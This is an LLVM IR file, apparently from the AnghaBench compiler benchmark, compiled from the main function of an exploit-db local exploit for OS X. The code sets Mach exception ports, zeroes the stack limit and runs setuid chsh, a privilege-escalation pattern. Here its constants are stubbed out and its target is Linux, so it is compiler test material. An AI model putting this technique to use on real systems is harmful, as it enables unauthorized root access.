; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_2463.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_2463.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.rlimit = type { i32 }

@MACH_PORT_RIGHT_RECEIVE = common dso_local global i32 0, align 4
@MACH_MSG_TYPE_MAKE_SEND = common dso_local global i32 0, align 4
@EXC_MASK_BAD_ACCESS = common dso_local global i32 0, align 4
@EXCEPTION_STATE_IDENTITY = common dso_local global i32 0, align 4
@PPC_THREAD_STATE = common dso_local global i32 0, align 4
@exc_server = common dso_local global i32 0, align 4
@main.rl = internal global %struct.rlimit zeroinitializer, align 4
@RLIMIT_STACK = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [14 x i8] c"/usr/bin/chsh\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"chsh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %4 = call i32 (...) @mach_task_self()
  store i32 %4, i32* %2, align 4
  %5 = load i32, i32* %2, align 4
  %6 = load i32, i32* @MACH_PORT_RIGHT_RECEIVE, align 4
  %7 = call i32 @mach_port_allocate(i32 %5, i32 %6, i32* %3)
  %8 = load i32, i32* %2, align 4
  %9 = load i32, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = load i32, i32* @MACH_MSG_TYPE_MAKE_SEND, align 4
  %12 = call i32 @mach_port_insert_right(i32 %8, i32 %9, i32 %10, i32 %11)
  %13 = load i32, i32* %2, align 4
  %14 = load i32, i32* @EXC_MASK_BAD_ACCESS, align 4
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* @EXCEPTION_STATE_IDENTITY, align 4
  %17 = load i32, i32* @PPC_THREAD_STATE, align 4
  %18 = call i32 @task_set_exception_ports(i32 %13, i32 %14, i32 %15, i32 %16, i32 %17)
  %19 = call i64 (...) @fork()
  %20 = icmp ne i64 %19, 0
  br i1 %20, label %21, label %26

21:                                               ; preds = %0
  %22 = load i32, i32* @exc_server, align 4
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @mach_msg_server_once(i32 %22, i32 512, i32 %23, i32 0)
  %25 = call i32 @wait(i32* null)
  br label %30

26:                                               ; preds = %0
  %27 = load i32, i32* @RLIMIT_STACK, align 4
  %28 = call i32 @setrlimit(i32 %27, %struct.rlimit* @main.rl)
  %29 = call i32 @execl(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32* null)
  br label %30

30:                                               ; preds = %26, %21
  ret i32 0
}

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @mach_port_allocate(i32, i32, i32*) #1

declare dso_local i32 @mach_port_insert_right(i32, i32, i32, i32) #1

declare dso_local i32 @task_set_exception_ports(i32, i32, i32, i32, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @mach_msg_server_once(i32, i32, i32, i32) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @setrlimit(i32, %struct.rlimit*) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
